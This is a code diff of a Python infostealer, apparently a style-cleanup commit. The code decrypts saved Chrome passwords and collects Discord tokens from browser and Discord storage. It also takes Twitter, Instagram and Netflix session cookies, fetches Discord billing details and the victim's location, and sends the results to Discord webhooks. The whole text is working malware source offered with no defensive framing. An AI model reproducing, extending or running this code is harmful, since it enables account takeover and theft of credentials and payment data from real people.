@@ -48,13 +48,14 @@ def get_user_data(tk):
     headers = {'Authorization': tk}
     response = get('https://discordapp.com/api/v6/users/@me',
                    headers=headers).json()
-    return [response['username'], response['discriminator'], response['email'], response['phone']]
+    return [response['username'], response['discriminator'],
+            response['email'], response['phone']]
 
 
 def has_payment_methods(tk):
     headers = {'Authorization': tk}
     response = get(
-        'https://discordapp.com/api/v6/users/@me/billing/payment-sources',  headers=headers).json()
+        'https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()
     return response
 
 
@@ -66,7 +67,7 @@ def cookies_grabber_mod(u):
         try:
             cookies.append(
                 str(getattr(browser_cookie3, browser)(domain_name=u)))
-        except:
+        except BaseException:
             pass
     return cookies
 
@@ -79,7 +80,7 @@ def get_Personal_data():
             Request(f'https://ipapi.co/{ip_address}/country_name')).read().decode().strip()
         city = urlopen(
             Request(f'https://ipapi.co/{ip_address}/city')).read().decode().strip()
-    except:
+    except BaseException:
         city = "City not found -_-"
         country = "Country not found -_-"
         ip_address = "No IP found -_-"
@@ -120,22 +121,25 @@ def get_encryption_key():
                                     "Google", "Chrome", "User Data", "Local State")
     with open(local_state_path, "r", encoding="utf-8") as f:
         local_state = loads(f.read())
-    return CryptUnprotectData(b64decode(local_state["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
+    return CryptUnprotectData(b64decode(local_state["os_crypt"]["encrypted_key"])[
+                              5:], None, None, None, 0)[1]
 
 
 def decrypt_data(data, key):
     try:
-        return AES.new(key, AES.MODE_GCM, data[3:15]).decrypt(data[15:])[:-16].decode()
-    except:
+        return AES.new(key, AES.MODE_GCM, data[3:15]).decrypt(
+            data[15:])[:-16].decode()
+    except BaseException:
         try:
             return str(CryptUnprotectData(data, None, None, None, 0)[1])
-        except:
+        except BaseException:
             return ""
 
 
 def main(dirpath):
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
+    chrome_psw_list = []
     if os.path.exists(db_path):
         key = get_encryption_key()
         filename = os.path.join(dirpath, "ChromeData.db")
@@ -157,13 +161,17 @@ def main(dirpath):
 
             def discord_tokens(path):
                 for file_name in os.listdir(path):
-                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                    if not file_name.endswith(
+                            '.log') and not file_name.endswith('.ldb'):
                         continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                    for line in [x.strip() for x in open(
+                            f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for regex in (
+                                r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                             for token in findall(regex, line):
                                 if token not in tokens:
                                     tokens.append(token)
+
             paths = [
                 os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome",
                              "User Data", "Default", "Local Storage", "leveldb"),
@@ -171,18 +179,19 @@ def main(dirpath):
                              "Local Storage", "leveldb"),
                 os.path.join(os.getenv('APPDATA'),
                              "Opera Software", "Opera Stable"),
-                os.path.join(os.getenv('APPDATA'), "discordptb"),
-                os.path.join(os.getenv('APPDATA'), "discordcanary"),
                 os.path.join(os.getenv('LOCALAPPDATA'), "BraveSoftware",
                              "Brave-Browser", "User Data", "Default"),
                 os.path.join(os.getenv('LOCALAPPDATA'), "Yandex",
-                             "YandexBrowser", "User Data", "Default")
+                             "YandexBrowser", "User Data", "Default"),
+                os.path.join(os.getenv('APPDATA'), "discordptb"),
+                os.path.join(os.getenv('APPDATA'), "discordcanary"),
             ]
             threads = []
 
             def find_wb(wb):
                 if os.path.exists(wb):
                     threads.append(Thread(target=discord_tokens, args=(wb,)))
+
             for j in paths:
                 find_wb(j)
             for t in threads:
@@ -194,7 +203,7 @@ def main(dirpath):
                 t_cookies.append(b.split(', '))
             for c in t_cookies:
                 for y in c:
-                    if search(r"auth_token", y) != None:
+                    if search(r"auth_token", y) is not None:
                         t_lst.append(y.split(' ')[1].split("=")[1])
         elif w == website[2]:
             insta_cookies, insta_lst = ([] for _ in range(2))
@@ -202,10 +211,11 @@ def main(dirpath):
                 insta_cookies.append(b.split(', '))
             browser_ = defaultdict(dict)
             for c in insta_cookies:
-                if all([search(r"ds_user_id", str(c)) != None, search(r"sessionid", str(c)) != None]):
+                if all([search(r"ds_user_id", str(c)) is not None,
+                       search(r"sessionid", str(c)) is not None]):
                     for y in c:
-                        conditions = [search(r"ds_user_id", y) != None, search(
-                            r"sessionid", y) != None]
+                        conditions = [search(r"ds_user_id", y) is not None, search(
+                            r"sessionid", y) is not None]
                         if any(conditions):
                             browser_[insta_cookies.index(c)][conditions.index(True)] = y.split(' ')[
                                 1].split("=")[1]
@@ -224,7 +234,7 @@ def main(dirpath):
                 n_cookies.append(b.split(', '))
             for c in n_cookies:
                 for y in c:
-                    if search(r"NetflixId", y) != None:
+                    if search(r"NetflixId", y) is not None:
                         data = y.split(' ')[1].split("=")[1]
                         if len(data) > 80:
                             n_lst.append([])
@@ -246,9 +256,10 @@ def main(dirpath):
                                   ['type'], lst_b[n]['billing_address']]
                     if writable_2 not in all_data_p:
                         all_data_p.append(writable_2)
-        except:
+        except BaseException:
             pass
-    return [tokens, list(set(t_lst)), list(set(tuple(element) for element in insta_lst)), all_data_p, chrome_psw_list, n_lst]
+    return [tokens, list(set(t_lst)), list(set(tuple(element)
+                                               for element in insta_lst)), all_data_p, chrome_psw_list, n_lst]
 
 
 def send_webhook(DISCORD_WEBHOOK_URLs):
@@ -270,7 +281,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
                 username, email, phone = f"{lst[0]}#{lst[1]}", lst[2], lst[3]
                 discord_T.add_row([t_, username, email, phone])
                 verified_tokens.append(t_)
-            except:
+            except BaseException:
                 pass
         for _t in main_info[1]:
             twitter_T.add_row([_t])
@@ -293,7 +304,8 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
         files_names = [[os.path.join(td, "Discord Tokens.txt"), discord_T], [os.path.join(td, "Twitter Tokens.txt"), twitter_T], [
             os.path.join(td, "Instagram Tokens.txt"), insta_T], [os.path.join(td, "Chrome Pass.txt"), chrome_Psw_t]]
         for x_, y_ in files_names:
-            if (y_ == files_names[0][1] and len(main_info[0]) != 0) or (y_ == files_names[1][1] and len(main_info[1]) != 0) or (y_ == files_names[2][1] and len(main_info[2]) != 0) or (y_ == files_names[3][1] and len(main_info[4]) != 0):
+            if (y_ == files_names[0][1] and len(main_info[0]) != 0) or (y_ == files_names[1][1] and len(main_info[1]) != 0) or (
+                    y_ == files_names[2][1] and len(main_info[2]) != 0) or (y_ == files_names[3][1] and len(main_info[4]) != 0):
                 with open(x_, 'w') as wr:
                     wr.write(y_.get_string())
         all_files = [os.path.join(
